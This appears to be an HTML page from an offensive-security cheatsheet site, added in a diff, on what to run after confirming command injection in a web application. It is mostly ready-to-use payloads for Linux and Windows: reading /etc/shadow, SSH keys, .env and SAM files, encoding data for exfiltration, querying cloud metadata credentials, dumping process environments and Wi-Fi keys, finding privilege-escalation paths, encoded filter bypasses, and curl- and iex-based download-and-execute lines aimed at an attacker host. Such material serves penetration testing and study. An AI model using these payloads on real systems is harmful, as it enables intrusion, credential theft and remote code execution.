@@ -1,0 +1,173 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Execution · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Command Injection</nav><h1>Execution</h1><p class="cx-lede">Running useful commands once injection is confirmed - enumeration, output capture, and platform-specific one-liners for Linux and Windows.</p><div class="cx-tags"><span class="cx-tag">MITRE T1059</span><span class="cx-tag">D3FEND D3-PSA, D3-PA, D3-EI</span><span class="cx-tag">IMPACT RCE</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>You confirmed injection. Now run something that earns the finding: identity, environment, network reachability, secrets on disk. Pick payloads that fit on one line, return useful output through whatever channel the app gives you, and don't crash the original command.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Linux
+&lt;original&gt;;id;hostname;uname -a;cat /etc/passwd
+# Windows
+&lt;original&gt;&amp;whoami&amp;hostname&amp;systeminfo</code></pre></figure>
+<h2 id="first-contact-enumeration">First-contact enumeration</h2>
+<p>Run these in order. Each answers a question that decides what comes next.</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">id                              # who am I, what groups
+hostname                        # is this the box I think it is
+uname -a                        # kernel version → kernel exploits
+whoami                          # short form of id
+pwd                             # working directory of the web process
+ls -la                          # what&#x27;s around
+cat /etc/passwd                 # users with shells
+cat /etc/os-release             # distro and version
+ip a                            # interfaces, internal IPs
+ss -tlnp 2&gt;/dev/null            # listening services (sockets)
+env                             # environment variables - secrets often here
+sudo -n -l                      # passwordless sudo entries</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">whoami /all                     # identity, groups, privileges
+hostname                        # machine name
+systeminfo                      # OS, patches, domain
+ipconfig /all                   # interfaces, DNS, domain
+net user                        # local users
+net localgroup administrators   # who&#x27;s admin
+tasklist /v                     # processes with usernames
+Get-ChildItem env:              # environment variables
+Get-LocalUser                   # PowerShell-native user list</code></pre></figure>
+<p>The <code>cmd.exe</code> equivalents (<code>whoami</code>, <code>hostname</code>, <code>ipconfig</code>, <code>net user</code>) work in both shells.</p>
+</div>
+</div>
+<h2 id="reading-files">Reading files</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">cat &lt;PATH&gt;                      # standard
+head -c 4096 &lt;PATH&gt;             # first 4KB only - cap noisy output
+tail -n 50 &lt;PATH&gt;               # last 50 lines
+xxd &lt;PATH&gt; | head               # binary preview
+base64 -w0 &lt;PATH&gt;               # for exfil through small fields</code></pre></figure>
+<p>High-value targets:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">/etc/passwd                     # user list
+/etc/shadow                     # if running as root
+/var/www/html/.env              # framework secrets, DB creds
+/var/www/html/config.php        # legacy PHP creds
+~/.ssh/id_rsa                   # SSH keys for current user
+~/.ssh/authorized_keys
+~/.bash_history                 # recent commands
+/root/.ssh/                     # if root
+/proc/self/environ              # current process env vars
+/proc/&lt;PID&gt;/cmdline             # process arguments - sometimes reveals creds</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">type &lt;PATH&gt;                                     # cmd-style
+Get-Content &lt;PATH&gt;                              # PowerShell-style
+Get-Content &lt;PATH&gt; -TotalCount 50               # first 50 lines
+[Convert]::ToBase64String([IO.File]::ReadAllBytes(&#x27;&lt;PATH&gt;&#x27;))   # base64 for exfil</code></pre></figure>
+<p>High-value targets:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">C:\Users\&lt;USER&gt;\Desktop\
+C:\Users\&lt;USER&gt;\Documents\
+C:\inetpub\wwwroot\web.config                   # IIS app config, often DB creds
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\Panther\Unattend.xml                 # autoinstall creds (LP)
+C:\Windows\System32\config\SAM                  # locked while running, but check</code></pre></figure>
+</div>
+</div>
+<h2 id="output-capture-patterns">Output capture patterns</h2>
+<p>The back-end may not return everything. Common shapes:</p>
+<ul>
+<li><strong>Output appended to original</strong> - your payload runs, you see both. Default for <code>;</code>, <code>\n</code>, <code>&amp;&amp;</code>.</li>
+<li><strong>Output replaces original</strong> - pipe-style. Use <code>|</code> or <code>; cmd; exit 0</code>.</li>
+<li><strong>Output captured to file then displayed parsed</strong> - parsing strips your additions. Inject <code>; &lt;CMD&gt; &gt; /tmp/.x; cat /tmp/.x</code> and read the file directly.</li>
+<li><strong>Only first line shown</strong> - chain with <code>;</code> and look at responses for the <em>first</em> line of each. Or use <code>head -n1</code> deliberately to control what's first.</li>
+<li><strong>Only stderr/stdout shown, not both</strong> - redirect: <code>id 2&gt;&amp;1</code>, or <code>id 1&gt;&amp;2</code>.</li>
+</ul>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<p>Force output through a known channel:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;id 2&gt;&amp;1                                # merge stderr into stdout
+;id;echo ===END===                      # delimiter for parsing
+;{ id; hostname; } 2&gt;&amp;1                 # group multiple commands
+;id &gt; /tmp/.r 2&gt;&amp;1; cat /tmp/.r         # write-then-read</code></pre></figure>
+<p>Compress before exfil if the field is size-limited:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;tar czf - /etc/passwd /etc/hosts 2&gt;/dev/null | base64 -w0</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">&amp; whoami 2&gt;&amp;1                                       # merge streams (cmd)
+&amp; whoami &amp; echo ===END===                           # delimiter
+;whoami | Out-String                                # force string output (PS)
+;Get-Content C:\out.txt                             # write-then-read pattern</code></pre></figure>
+<p>Encode for size-limited or filtered fields:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)))</code></pre></figure>
+</div>
+</div>
+<h2 id="useful-one-liners">Useful one-liners</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<p>Find writable directories (staging area for tools):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;find / -writable -type d 2&gt;/dev/null | grep -Ev &#x27;^/(proc|sys|run)&#x27; | head</code></pre></figure>
+<p>Find SUID binaries (privesc candidates):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;find / -perm -4000 -type f 2&gt;/dev/null</code></pre></figure>
+<p>Pull recent web app config files:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;find /var/www /opt /srv -maxdepth 4 -name &#x27;*.env&#x27; -o -name &#x27;config.php&#x27; -o -name &#x27;settings.py&#x27; 2&gt;/dev/null</code></pre></figure>
+<p>Check for cloud metadata (AWS/Azure/GCP):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre></figure>
+<p>Dump process environments (other users' secrets sometimes leak):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;for p in /proc/[0-9]*/environ; do echo $p; tr &#x27;\0&#x27; &#x27;\n&#x27; &lt; $p 2&gt;/dev/null; done</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<p>Stored credentials:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;cmdkey /list
+;Get-ChildItem -Recurse -ErrorAction SilentlyContinue -Path C:\Users -Include *.kdbx,*.config,unattend.xml,sysprep.xml</code></pre></figure>
+<p>Saved Wi-Fi profiles (with cleartext keys):</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;netsh wlan show profile
+;netsh wlan show profile name=&quot;&lt;NAME&gt;&quot; key=clear</code></pre></figure>
+<p>Service binaries with weak permissions (privesc):</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;Get-CimInstance Win32_Service | Select Name,PathName,StartName | Format-Table -Auto</code></pre></figure>
+<p>Cloud metadata:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;Invoke-RestMethod -Uri http://169.254.169.254/metadata/instance?api-version=2021-02-01 -Headers @{Metadata=&quot;true&quot;} -TimeoutSec 2</code></pre></figure>
+</div>
+</div>
+<h2 id="chaining-commands">Chaining commands</h2>
+<p>When you need multiple commands and the separator situation is constrained, group them.</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;{ id; hostname; uname -a; } 2&gt;&amp;1               # group, single output stream
+;sh -c &#x27;id;hostname;uname -a&#x27;                   # explicit shell wrapper
+;bash -c &#x27;$(echo aWQ7aG9zdG5hbWU=|base64 -d)&#x27;   # encoded payload (filter bypass)</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">&amp; (whoami &amp; hostname &amp; systeminfo)              # cmd: parens group commands
+; whoami; hostname; systeminfo                  # PS: semicolons chain
+;powershell -c &quot;whoami;hostname&quot;                # explicit shell wrapper</code></pre></figure>
+<p>PowerShell encoded command (filter bypass + chaining):</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;powershell -enc &lt;base64-utf16le&gt;</code></pre></figure>
+</div>
+</div>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>When the original command is <code>ping -c 1 &lt;input&gt;</code> and you can't break out cleanly, append rather than break: <code>127.0.0.1; &lt;CMD&gt;</code> keeps the ping happy and your output appears underneath. Use <code>||</code> only when you <em>want</em> the original to fail.</p>
+</div>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>Command runs but no useful output appears.</strong> The web layer is filtering or trimming. Write to a file you can read via another endpoint, or move to OOB exfil (<a href="../blind/index.html">Blind &amp; OOB</a>).</li>
+<li><strong>PATH is restricted.</strong> <code>id</code> works, <code>python</code> doesn't. The web user has a stripped PATH. Use absolute paths: <code>/usr/bin/python3</code>, <code>/bin/nc</code>. Find binaries with <code>;ls /usr/bin /usr/local/bin /opt</code>.</li>
+<li><strong>Shell is <code>dash</code>, not <code>bash</code>.</strong> Default <code>/bin/sh</code> on Debian/Ubuntu is dash, which lacks bash-isms (<code>&lt;&lt;&lt;</code>, <code>${var:0:1}</code>, arrays). Use POSIX-only constructs, or invoke <code>bash -c '...'</code> explicitly.</li>
+<li><strong>Windows cmd.exe path issues.</strong> <code>whoami</code> works without a path; <code>Get-Content</code> requires PowerShell. If <code>;</code> doesn't separate, you're in cmd.exe - use <code>&amp;</code> and stick to cmd-native commands.</li>
+<li><strong>Long payloads truncated.</strong> URL parameters often cap at 2-8KB. Move heavy logic into a one-liner that downloads a script: <code>;curl &lt;ATTACKER&gt;/x.sh|sh</code> (Linux) or <code>;iex(iwr -UseBasicParsing &lt;ATTACKER&gt;/x.ps1)</code> (PowerShell).</li>
+<li><strong>Non-ASCII characters mangled.</strong> UTF-8 in your payload may double-encode. Stick to ASCII; use <code>\xNN</code> or base64 for binary content.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>Output capture is the difference between proof-of-concept and a real finding. A separator that "works" but returns nothing is functionally identical to no injection at all from a reporting perspective - you can't show anything in the writeup. Always confirm with output (<code>id</code>, <code>whoami</code>) before chasing exploitation. If output is structurally unavailable, switch to <a href="../blind/index.html">blind techniques</a> immediately rather than burning time on visible-output payloads.</p></article><nav class="cx-pager"><a class="cx-prev" href="../detection/index.html">Previous: Detection</a><a class="cx-next" href="../blind/index.html">Next: Blind &amp; OOB</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
